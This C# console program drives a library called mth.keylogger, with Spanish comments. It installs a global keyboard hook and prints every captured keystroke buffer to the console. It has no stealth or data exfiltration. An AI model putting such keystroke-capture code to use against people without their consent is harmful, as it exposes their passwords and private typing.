using mth.keylogger;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace mth.keylogger.console
{
    class Program
    {
        public static KeyboardHook _kbHook { get; set; }

        static void Main(string[] args)
        {
            if (_kbHook == null)
            {
                _kbHook = KeyboardHook.GetInstance();
                // Se asigna un manejador de evento
                _kbHook.BufferChanged += _kbHook_BufferChanged;
            }
            if (!_kbHook.IsHooked)
            {
                _kbHook.Hook();
                Console.WriteLine("Detección de teclado activada.");
            }
            else
            {
                _kbHook.UnHook();
                Console.WriteLine("Detección de teclado desactivada.");
            }

            while (true)
            {
                Console.ReadLine();
            }
        }

        public static void _kbHook_BufferChanged(object sender, EventArgs e)
        {
            Console.WriteLine(_kbHook.Buffer);
        }
    }
}
